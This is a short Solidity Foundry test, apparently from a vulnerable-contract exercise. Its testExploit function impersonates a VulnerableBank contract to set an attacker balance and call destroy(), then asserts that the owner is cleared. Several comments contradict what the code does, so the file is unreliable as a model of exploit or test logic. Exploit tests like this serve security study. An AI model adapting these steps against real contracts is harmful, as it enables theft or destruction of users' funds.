// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract VulnerableBankTest is BaseTestWithBalanceLog {
    VulnerableBank target;

    function setUp() public virtual override {
        target = new VulnerableBank();
    }

    function testExploit() public {
        // Step 1: Transfer tokens from the default owner to another account
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 2 ether);
        vm.prank(address(target));
        target.setBalance(attacker, 1 ether);

        // Step 2: Call the destroy function on the token contract as the default owner
        deal(address(target), 0.5 ether); // Ensure there are funds to destroy
        vm.startPrank(address(target));
        target.destroy();
        vm.stopPrank();

        // Validation
        assertEq(target.owner(), address(0)); // The contract should be destroyed and the owner set to zero-address
    }
}